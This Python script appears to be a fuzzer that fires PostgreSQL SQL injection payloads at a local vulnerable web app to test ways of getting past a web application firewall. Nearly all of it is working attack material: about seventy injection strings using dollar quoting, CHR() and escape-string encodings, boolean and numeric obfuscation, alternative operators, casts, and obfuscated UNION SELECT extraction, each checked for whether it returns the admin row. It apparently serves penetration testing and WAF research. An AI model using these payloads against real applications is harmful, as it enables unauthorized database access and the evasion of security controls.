#!/usr/bin/env python3
"""
PostgreSQL WAF Evasion HTTP Fuzzer
Tests interesting obfuscation techniques through vulnerable web app.
"""

import os
import requests
import sys

BASE_URL = "http://localhost:3000"


def validate_outfile(path: str, force: bool = False) -> str:
    """Validate output file path for safety.

    Args:
        path: The output file path to validate
        force: If True, allow overwriting existing files

    Returns:
        The validated path

    Raises:
        SystemExit: If validation fails
    """
    # Reject absolute paths
    if os.path.isabs(path):
        print(f"ERROR: Absolute paths not allowed: {path}", file=sys.stderr)
        print("Use a relative path under the current directory.", file=sys.stderr)
        sys.exit(1)

    # Reject parent traversal
    if ".." in path.split(os.sep):
        print(f"ERROR: Parent traversal not allowed: {path}", file=sys.stderr)
        sys.exit(1)

    # Normalize and verify it stays under cwd
    normalized = os.path.normpath(path)
    abs_path = os.path.abspath(normalized)
    cwd = os.getcwd()
    if not abs_path.startswith(cwd + os.sep) and abs_path != cwd:
        # Allow files directly in cwd
        if os.path.dirname(abs_path) != cwd:
            print(f"ERROR: Path escapes current directory: {path}", file=sys.stderr)
            sys.exit(1)

    # Check if target directory exists
    target_dir = os.path.dirname(normalized) or "."
    if not os.path.isdir(target_dir):
        print(f"ERROR: Directory does not exist: {target_dir}", file=sys.stderr)
        print("Create the directory first or use a different path.", file=sys.stderr)
        sys.exit(1)

    # Prevent accidental overwrites without --force
    if os.path.exists(normalized) and not force:
        print(f"ERROR: File already exists: {normalized}", file=sys.stderr)
        print("Use --force to overwrite, or specify a different filename.", file=sys.stderr)
        sys.exit(1)

    return normalized

def test_payload(endpoint, param, payload, desc=None):
    """Test a payload and return result.

    Args:
        endpoint: API endpoint path (e.g., "/users")
        param: Parameter name to inject into
        payload: The SQL injection payload
        desc: Optional description for logging/debugging

    Returns:
        dict with keys: success, desc, and either count/data or error
    """
    result_base = {"desc": desc}
    try:
        if endpoint == "/users":
            r = requests.get(f"{BASE_URL}{endpoint}", params={param: payload}, timeout=5)
        else:
            r = requests.post(f"{BASE_URL}{endpoint}", json={param: payload}, timeout=5)

        try:
            data = r.json()
        except ValueError:
            return {**result_base, "success": False, "error": f"Invalid JSON response: {r.text[:50]}"}

        # Check if injection worked (got more than expected or specific data)
        if "users" in data:
            return {**result_base, "success": True, "count": len(data["users"]), "data": data}
        elif "error" in data:
            return {**result_base, "success": False, "error": data["error"][:50]}
        else:
            return {**result_base, "success": True, "data": data}
    except Exception as e:
        return {**result_base, "success": False, "error": str(e)[:50]}


def main():
    # Parse arguments
    args = sys.argv[1:]
    force = "--force" in args
    if force:
        args.remove("--force")

    outfile_arg = args[0] if args else "pg_waf_evasion_http_results.txt"
    outfile = validate_outfile(outfile_arg, force=force)

    print("PostgreSQL WAF Evasion HTTP Fuzzer")
    print(f"Target: {BASE_URL}")
    print(f"Output: {outfile}")

    # Verify app is running
    try:
        r = requests.get(f"{BASE_URL}/users?id=1", timeout=5)
        baseline = r.json()
        print(f"\nBaseline: {baseline}\n")
    except Exception as e:
        print(f"ERROR: App not running? {e}")
        sys.exit(1)

    results = []
    results.append("# PostgreSQL WAF Evasion HTTP Fuzzing Results\n")

    # ===========================================
    # 1. DOLLAR QUOTE VARIATIONS
    # ===========================================
    print("="*60)
    print("1. DOLLAR QUOTE VARIATIONS")
    print("="*60)
    results.append("\n## 1. Dollar Quote Variations\n")

    dollar_tests = [
        # Basic - extract admin using dollar quotes instead of single quotes
        ("1 OR username=$$admin$$--", "basic $$"),
        ("1 OR username=$tag$admin$tag$--", "tagged $tag$"),
        ("1 OR username=$a$admin$a$--", "single char $a$"),
        ("1 OR username=$_$admin$_$--", "underscore $_$"),
        # Unicode tags
        ("1 OR username=$α$admin$α$--", "greek tag $α$"),
        ("1 OR username=$日$admin$日$--", "CJK tag $日$"),
        ("1 OR username=$ñ$admin$ñ$--", "latin ext $ñ$"),
    ]

    for payload, desc in dollar_tests:
        r = test_payload("/users", "id", payload, desc)
        status = "✓" if r["success"] and r.get("count", 0) >= 1 else "✗"
        print(f"  {status} {desc}: {r.get('count', r.get('error', 'ERR'))}")
        results.append(f"- {status} {desc}: `{payload[:50]}`")

    # ===========================================
    # 2. STRING ENCODING BYPASSES
    # ===========================================
    print("\n" + "="*60)
    print("2. STRING ENCODING BYPASSES")
    print("="*60)
    results.append("\n## 2. String Encoding Bypasses\n")

    # CHR() to avoid 'admin' string
    chr_admin = "CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)"

    encoding_tests = [
        # CHR() encoding
        (f"1 OR username=({chr_admin})--", "CHR() concat"),
        ("1 OR username=CONCAT(CHR(97),CHR(100),CHR(109),CHR(105),CHR(110))--", "CONCAT+CHR()"),
        # Escape strings
        ("1 OR username=E'\\x61\\x64\\x6d\\x69\\x6e'--", "E'' hex escape"),
        ("1 OR username=E'\\141\\144\\155\\151\\156'--", "E'' octal escape"),
        # Unicode strings
        ("1 OR username=U&'\\0061\\0064\\006d\\0069\\006e'--", "U&'' unicode"),
        ("1 OR username=U&'!0061dmin' UESCAPE '!'--", "custom UESCAPE !"),
        ("1 OR username=U&'#0061dmin' UESCAPE '#'--", "custom UESCAPE #"),
    ]

    for payload, desc in encoding_tests:
        r = test_payload("/users", "id", payload, desc)
        status = "✓" if r["success"] and r.get("count", 0) >= 1 else "✗"
        print(f"  {status} {desc}: {r.get('count', r.get('error', 'ERR'))}")
        results.append(f"- {status} {desc}")

    # ===========================================
    # 3. BOOLEAN REPRESENTATION BYPASSES
    # ===========================================
    print("\n" + "="*60)
    print("3. BOOLEAN REPRESENTATION BYPASSES")
    print("="*60)
    results.append("\n## 3. Boolean Representation Bypasses\n")

    bool_tests = [
        # Instead of OR 1=1
        ("1 OR true--", "OR true"),
        ("1 OR TRUE--", "OR TRUE"),
        ("1 OR 't'::boolean--", "OR 't'::boolean"),
        ("1 OR 'yes'::boolean--", "OR 'yes'::boolean"),
        ("1 OR 'on'::boolean--", "OR 'on'::boolean"),
        ("1 OR 'y'::boolean--", "OR 'y'::boolean"),
        ("1 OR 1::boolean--", "OR 1::boolean"),
        ("1 OR NOT false--", "OR NOT false"),
        ("1 OR NOT NOT true--", "OR NOT NOT true"),
        ("1 OR BOOL 't'--", "OR BOOL 't'"),
    ]

    for payload, desc in bool_tests:
        r = test_payload("/users", "id", payload, desc)
        # Success = got multiple users back
        status = "✓" if r["success"] and r.get("count", 0) > 1 else "✗"
        print(f"  {status} {desc}: {r.get('count', r.get('error', 'ERR'))}")
        results.append(f"- {status} {desc}: `{payload}`")

    # ===========================================
    # 4. NUMERIC OBFUSCATION
    # ===========================================
    print("\n" + "="*60)
    print("4. NUMERIC OBFUSCATION")
    print("="*60)
    results.append("\n## 4. Numeric Obfuscation\n")

    # Different ways to express "id=1"
    numeric_tests = [
        ("1e0", "scientific 1e0"),
        ("1E0", "scientific 1E0"),
        ("10e-1", "scientific 10e-1"),
        ("0.1e1", "scientific 0.1e1"),
        ("2-1", "subtraction 2-1"),
        ("0+1", "addition 0+1"),
        ("1*1", "multiplication 1*1"),
        ("2/2", "division 2/2"),
        ("3%2", "modulo 3%2"),
        ("2>>1", "right shift 2>>1"),
        ("1<<0", "left shift 1<<0"),
        ("ABS(-1)", "ABS(-1)"),
        ("CEIL(0.1)", "CEIL(0.1)"),
        ("FLOOR(1.9)", "FLOOR(1.9)"),
        ("LENGTH('x')", "LENGTH('x')"),
        ("ASCII('1')-48", "ASCII('1')-48"),
    ]

    for payload, desc in numeric_tests:
        r = test_payload("/users", "id", payload, desc)
        # Success = got admin user (id=1)
        got_admin = False
        if r["success"] and "data" in r:
            users = r["data"].get("users", [])
            got_admin = any(u.get("username") == "admin" for u in users)
        status = "✓" if got_admin else "✗"
        print(f"  {status} {desc}")
        results.append(f"- {status} {desc}: `{payload}`")

    # ===========================================
    # 5. OPERATOR ALTERNATIVES
    # ===========================================
    print("\n" + "="*60)
    print("5. OPERATOR ALTERNATIVES")
    print("="*60)
    results.append("\n## 5. Operator Alternatives\n")

    # Alternatives to LIKE for pattern matching
    operator_tests = [
        ("1 OR username LIKE $$admin$$--", "LIKE"),
        ("1 OR username ILIKE $$ADMIN$$--", "ILIKE (case-insensitive)"),
        ("1 OR username SIMILAR TO $$admin$$--", "SIMILAR TO"),
        ("1 OR username ~ $$^admin$$--", "regex ~"),
        ("1 OR username ~* $$^ADMIN$$--", "regex ~* (case-insensitive)"),
        ("1 OR username ^@ $$adm$$--", "starts-with ^@"),
        ("1 OR POSITION($$admin$$ IN username) > 0--", "POSITION()"),
        ("1 OR STRPOS(username, $$admin$$) > 0--", "STRPOS()"),
        # Comparison alternatives
        ("1 OR id BETWEEN 1 AND 1--", "BETWEEN"),
        ("1 OR id IN (1)--", "IN ()"),
        ("1 OR id = ANY(ARRAY[1])--", "= ANY(ARRAY[])"),
        ("1 OR id = ANY('{1}'::int[])--", "= ANY('{}'::int[])"),
        ("1 OR id = SOME(ARRAY[1])--", "= SOME()"),
    ]

    for payload, desc in operator_tests:
        r = test_payload("/users", "id", payload, desc)
        status = "✓" if r["success"] and r.get("count", 0) >= 1 else "✗"
        print(f"  {status} {desc}: {r.get('count', r.get('error', 'ERR'))}")
        results.append(f"- {status} {desc}")

    # ===========================================
    # 6. TYPE CASTING VARIATIONS
    # ===========================================
    print("\n" + "="*60)
    print("6. TYPE CASTING VARIATIONS")
    print("="*60)
    results.append("\n## 6. Type Casting Variations\n")

    cast_tests = [
        ("'1'::int", "::int"),
        ("'1'::integer", "::integer"),
        ("'1'::int4", "::int4"),
        ("CAST('1' AS int)", "CAST AS int"),
        ("int4('1')", "int4() function"),
        ("'1'::text::int", "chain cast"),
        # Boolean to int for conditions
        ("(username=$$admin$$)::int", "bool::int"),
    ]

    for payload, desc in cast_tests:
        r = test_payload("/users", "id", payload, desc)
        got_admin = False
        if r["success"] and "data" in r:
            users = r["data"].get("users", [])
            got_admin = any(u.get("username") == "admin" for u in users)
        status = "✓" if got_admin else "✗"
        print(f"  {status} {desc}")
        results.append(f"- {status} {desc}: `{payload}`")

    # ===========================================
    # 7. SCHEMA-QUALIFIED FUNCTIONS
    # ===========================================
    print("\n" + "="*60)
    print("7. SCHEMA-QUALIFIED FUNCTIONS")
    print("="*60)
    results.append("\n## 7. Schema-Qualified Functions\n")

    schema_tests = [
        ("1 OR pg_catalog.length(username) > 0--", "pg_catalog.length()"),
        ("1 OR pg_catalog.upper(username) = $$ADMIN$$--", "pg_catalog.upper()"),
        ("1 OR pg_catalog.lower(username) = $$admin$$--", "pg_catalog.lower()"),
        ("1 OR pg_catalog.substr(username,1,5) = $$admin$$--", "pg_catalog.substr()"),
    ]

    for payload, desc in schema_tests:
        r = test_payload("/users", "id", payload, desc)
        status = "✓" if r["success"] and r.get("count", 0) >= 1 else "✗"
        print(f"  {status} {desc}: {r.get('count', r.get('error', 'ERR'))}")
        results.append(f"- {status} {desc}")

    # ===========================================
    # 8. UNION-BASED WITH OBFUSCATION
    # ===========================================
    print("\n" + "="*60)
    print("8. UNION-BASED WITH OBFUSCATION")
    print("="*60)
    results.append("\n## 8. UNION-Based with Obfuscation\n")

    # The app returns: id, username, email, role
    union_tests = [
        # Basic UNION (baseline)
        ("0 UNION SELECT 1,$$test$$,$$t@t.com$$,$$user$$--", "basic UNION $$"),
        # With CHR()
        (f"0 UNION SELECT 1,{chr_admin},$$t@t.com$$,$$user$$--", "UNION + CHR()"),
        # With E''
        ("0 UNION SELECT 1,E'\\x74\\x65\\x73\\x74',$$t@t.com$$,$$user$$--", "UNION + E'' hex"),
        # With U&''
        ("0 UNION SELECT 1,U&'\\0074\\0065\\0073\\0074',$$t@t.com$$,$$user$$--", "UNION + U&''"),
        # With type casting
        ("0 UNION SELECT '1'::int,$$test$$,$$t@t.com$$,$$user$$--", "UNION + ::int"),
        # With scientific notation
        ("0e0 UNION SELECT 1,$$test$$,$$t@t.com$$,$$user$$--", "0e0 UNION"),
        # With whitespace alternatives
        ("0%09UNION%09SELECT%091,$$test$$,$$t@t.com$$,$$user$$--", "UNION + tab"),
        ("0%0aUNION%0aSELECT%0a1,$$test$$,$$t@t.com$$,$$user$$--", "UNION + newline"),
        # Comment-based
        ("0/**/UNION/**/SELECT/**/1,$$test$$,$$t@t.com$$,$$user$$--", "UNION + /**/"),
        ("0 UNION--\nSELECT 1,$$test$$,$$t@t.com$$,$$user$$", "UNION--\\nSELECT"),
    ]

    for payload, desc in union_tests:
        r = test_payload("/users", "id", payload, desc)
        status = "✓" if r["success"] and r.get("count", 0) >= 1 else "✗"
        print(f"  {status} {desc}: {r.get('count', r.get('error', 'ERR'))}")
        results.append(f"- {status} {desc}")

    # ===========================================
    # 9. COMBINED OBFUSCATION TECHNIQUES
    # ===========================================
    print("\n" + "="*60)
    print("9. COMBINED OBFUSCATION TECHNIQUES")
    print("="*60)
    results.append("\n## 9. Combined Obfuscation Techniques\n")

    combined_tests = [
        # Multiple techniques combined
        ("1e0 OR 'yes'::boolean--", "scientific + bool"),
        (f"1 OR username=({chr_admin}) AND 'on'::boolean--", "CHR + bool"),
        ("0/**/UNION/**/SELECT/**/1,$α$test$α$,$β$t@t$β$,$γ$user$γ$--", "/**/ + unicode tags"),
        ("0%09UNION%09SELECT%09'1'::int,$$test$$,$$t@t.com$$,$$user$$--", "tab + cast + $$"),
        ("ABS(-1) OR pg_catalog.length(username)>0--", "func + schema-qualified"),
    ]

    for payload, desc in combined_tests:
        r = test_payload("/users", "id", payload, desc)
        status = "✓" if r["success"] and r.get("count", 0) >= 1 else "✗"
        print(f"  {status} {desc}: {r.get('count', r.get('error', 'ERR'))}")
        results.append(f"- {status} {desc}")

    # Write results
    output_content = '\n'.join(results)
    write_failed = False
    try:
        with open(outfile, 'w', encoding='utf-8') as f:
            f.write(output_content)
            f.flush()
            os.fsync(f.fileno())
    except (IOError, OSError) as e:
        write_failed = True
        print(f"\nERROR: Failed to write to {outfile}: {e}", file=sys.stderr)
        print("Outputting results to stderr instead:\n", file=sys.stderr)
        print(output_content, file=sys.stderr)

    print(f"\n{'='*60}")
    if write_failed:
        print("Results output to stderr (file write failed)")
    else:
        print(f"Results written to: {outfile}")
    print(f"{'='*60}")
    return 1 if write_failed else 0


if __name__ == "__main__":
    main()
